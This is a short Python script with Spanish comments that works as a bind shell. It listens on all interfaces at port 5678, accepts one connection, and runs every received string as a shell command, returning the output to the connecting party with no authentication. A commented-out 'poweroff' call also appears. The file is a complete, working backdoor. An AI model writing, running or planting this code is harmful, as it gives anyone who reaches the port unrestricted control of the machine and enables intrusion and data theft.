import socket
import sys
import time
import subprocess

#subprocess.call("poweroff")

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
server_address = ("0.0.0.0", 5678)
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)
sock,(host_c,puerto_c) = sock.accept()

while True:
        cmd  = sock.recv(100000)# recibimos 100000 bytes de datos en datos,
        output = subprocess.Popen(cmd, shell=True, bufsize=100000, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,close_fds=True)# habrimos un nuevo proceso, el mismo seria el que recibimos con recv y guardamos en  cmd
        out = output.stdout.read() #leemos la salida de dicho proceso
        sock.send(out)#enviamos la salida del proceso al cliente                                                                      
